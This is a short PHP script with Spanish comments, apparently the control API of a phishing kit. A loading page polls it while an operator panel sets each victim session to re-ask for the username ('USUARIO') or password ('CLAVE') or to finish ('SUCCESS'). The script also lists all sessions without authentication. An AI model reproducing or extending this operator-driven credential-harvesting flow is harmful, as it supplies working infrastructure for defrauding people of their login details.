<?php
// control_api.php
$sessionsFile = 'data/sessions_status.json';

// Función para cargar y guardar el JSON
function getSessions($file) {
    // Maneja si el archivo no existe
    return file_exists($file) ? json_decode(file_get_contents($file), true) : [];
}

function saveSessions($file, $sessions) {
    file_put_contents($file, json_encode($sessions));
}

$sessions = getSessions($sessionsFile);

header('Content-Type: application/json');

// --- Petición GET: CONSULTAR ESTATUS (Usado por cargando.php) ---
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['session_id'])) {
    $sessionId = $_GET['session_id'];

    if (isset($sessions[$sessionId])) {
        echo json_encode(['status' => $sessions[$sessionId]['status']]);
    } else {
        echo json_encode(['status' => 'NOT_FOUND']);
    }
    exit;
}

// --- Petición POST: ESTABLECER DECISIÓN (Usado por control_panel.php) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['session_id']) && isset($_POST['action'])) {
    $sessionId = $_POST['session_id'];
    $action = $_POST['action'];

    if (isset($sessions[$sessionId])) {
        // Solo permitimos estas acciones como decisiones finales
        if (in_array($action, ['CLAVE', 'USUARIO', 'SUCCESS'])) {
            $sessions[$sessionId]['status'] = $action;
            saveSessions($sessionsFile, $sessions);

            // Opcional: Eliminar la sesión después de la decisión
            // unset($sessions[$sessionId]); 
            // saveSessions($sessionsFile, $sessions);

            echo json_encode(['success' => true, 'new_status' => $action]);
        } else {
            echo json_encode(['success' => false, 'error' => 'Invalid action']);
        }
    } else {
        echo json_encode(['success' => false, 'error' => 'Session not found']);
    }
    exit;
}

// Si no hay parámetros válidos, devolvemos las sesiones activas (para el CPanel)
echo json_encode($sessions);
?>